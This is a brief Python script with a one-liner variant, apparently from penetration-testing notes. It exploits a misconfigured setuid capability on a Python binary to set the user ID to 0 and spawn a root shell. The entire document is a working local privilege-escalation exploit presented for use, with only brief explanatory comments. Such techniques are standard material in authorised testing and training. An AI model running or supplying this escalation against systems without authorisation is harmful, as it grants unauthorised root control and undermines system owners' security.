#This quick script, can be used when you have find a set uid capability on a system. The script will set the uid to "0" and get you a root shell
"""Pythons os module lets us call system level functionality. For example dealing with processes, or the environment. 
It will also let us call the setuid() function. This requires root permissions, which we can get through the capabilities (credit to 245ct by Dan Goldsmith)"""

import os
os.setuid(0)
os.system('/bin/sh')


#can also be used as a one-liner:  ./python3 -c "import os; os.setuid(0); os.system('/bin/sh')"
